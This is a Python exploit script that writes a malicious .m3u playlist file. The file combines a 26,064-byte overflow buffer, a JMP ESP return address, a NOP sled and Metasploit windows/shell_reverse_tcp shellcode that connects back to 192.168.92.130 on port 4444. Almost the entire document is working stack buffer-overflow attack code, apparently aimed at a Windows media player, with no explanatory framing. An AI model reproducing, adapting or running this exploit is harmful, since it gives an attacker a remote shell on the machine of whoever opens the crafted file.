import struct
OFFSET = 26064
garbage = "A" * OFFSET

jmp_esp = 0x7CB48EED
EIP = struct.pack("<I", jmp_esp)
nop_sled = "\x90" * 100

# msf5 payload(windows/shell_reverse_tcp) > generate -b '\x00\xFF\x0A\x0D\x40' -f python
# windows/shell_reverse_tcp - 351 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=192.168.92.130, LPORT=4444,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5,
# PrependMigrate=false, EXITFUNC=seh, CreateSession=true
buf =  ""
buf += "\xb8\xab\xbf\x93\xa9\xdd\xc4\xd9\x74\x24\xf4\x5d\x33"
buf += "\xc9\xb1\x52\x31\x45\x12\x03\x45\x12\x83\x6e\xbb\x71"
buf += "\x5c\x8c\x2c\xf7\x9f\x6c\xad\x98\x16\x89\x9c\x98\x4d"
buf += "\xda\x8f\x28\x05\x8e\x23\xc2\x4b\x3a\xb7\xa6\x43\x4d"
buf += "\x70\x0c\xb2\x60\x81\x3d\x86\xe3\x01\x3c\xdb\xc3\x38"
buf += "\x8f\x2e\x02\x7c\xf2\xc3\x56\xd5\x78\x71\x46\x52\x34"
buf += "\x4a\xed\x28\xd8\xca\x12\xf8\xdb\xfb\x85\x72\x82\xdb"
buf += "\x24\x56\xbe\x55\x3e\xbb\xfb\x2c\xb5\x0f\x77\xaf\x1f"
buf += "\x5e\x78\x1c\x5e\x6e\x8b\x5c\xa7\x49\x74\x2b\xd1\xa9"
buf += "\x09\x2c\x26\xd3\xd5\xb9\xbc\x73\x9d\x1a\x18\x85\x72"
buf += "\xfc\xeb\x89\x3f\x8a\xb3\x8d\xbe\x5f\xc8\xaa\x4b\x5e"
buf += "\x1e\x3b\x0f\x45\xba\x67\xcb\xe4\x9b\xcd\xba\x19\xfb"
buf += "\xad\x63\xbc\x70\x43\x77\xcd\xdb\x0c\xb4\xfc\xe3\xcc"
buf += "\xd2\x77\x90\xfe\x7d\x2c\x3e\xb3\xf6\xea\xb9\xb4\x2c"
buf += "\x4a\x55\x4b\xcf\xab\x7c\x88\x9b\xfb\x16\x39\xa4\x97"
buf += "\xe6\xc6\x71\x37\xb6\x68\x2a\xf8\x66\xc9\x9a\x90\x6c"
buf += "\xc6\xc5\x81\x8f\x0c\x6e\x2b\x6a\xc7\x51\x04\x28\x95"
buf += "\x3a\x57\xd0\x88\xe6\xde\x36\xc0\x06\xb7\xe1\x7d\xbe"
buf += "\x92\x79\x1f\x3f\x09\x04\x1f\xcb\xbe\xf9\xee\x3c\xca"
buf += "\xe9\x87\xcc\x81\x53\x01\xd2\x3f\xfb\xcd\x41\xa4\xfb"
buf += "\x98\x79\x73\xac\xcd\x4c\x8a\x38\xe0\xf7\x24\x5e\xf9"
buf += "\x6e\x0e\xda\x26\x53\x91\xe3\xab\xef\xb5\xf3\x75\xef"
buf += "\xf1\xa7\x29\xa6\xaf\x11\x8c\x10\x1e\xcb\x46\xce\xc8"
buf += "\x9b\x1f\x3c\xcb\xdd\x1f\x69\xbd\x01\x91\xc4\xf8\x3e"
buf += "\x1e\x81\x0c\x47\x42\x31\xf2\x92\xc6\x4f\x02\x2e\xd3"
buf += "\xd8\xbd\xdb\x9e\x84\x3d\x36\xdc\xb0\xbd\xb2\x9d\x46"
buf += "\xdd\xb7\x98\x03\x59\x24\xd1\x1c\x0c\x4a\x46\x1c\x05"

shellcode = buf
payload = garbage + EIP + nop_sled + shellcode

with open("%s.m3u" % __file__[:-3], "wb") as f:
    f.write(payload)
    f.close()
